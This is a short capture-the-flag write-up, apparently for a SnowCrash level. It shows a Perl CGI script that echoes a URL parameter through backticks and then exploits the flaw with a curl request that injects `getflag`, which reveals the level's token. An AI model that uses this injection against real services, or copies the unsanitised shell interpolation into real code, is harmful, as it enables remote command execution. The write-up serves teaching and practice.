In the **home** folder there is a perl file named **level04.pl** containing the following code :
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};						# Allows you to set a parameter
print "Content-type: text/html\n\n";	# Poster as HTLM
sub x {									# Function x
  $y = $_[0];							# Takes the first parameter
  print `echo $y 2>&1`;					# Echo the parameter
}
x(param("x"));							# Calls the function
```

So we understand that the perl will run if we go to the IP:4747 page,
moreover it takes a parameter (thanks to the url) x, that it will **echo**.

<pre><code>> curl IP:4747?x=test
test
</code></pre>

We realize that there is no special check against the parameter, so we try to inject a command :

<pre><code>> curl IP:4747?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
</code></pre>
> We escape the **`** to avoid the return of the **getflag** command, the goal is that the command is executed at the time of **echo**.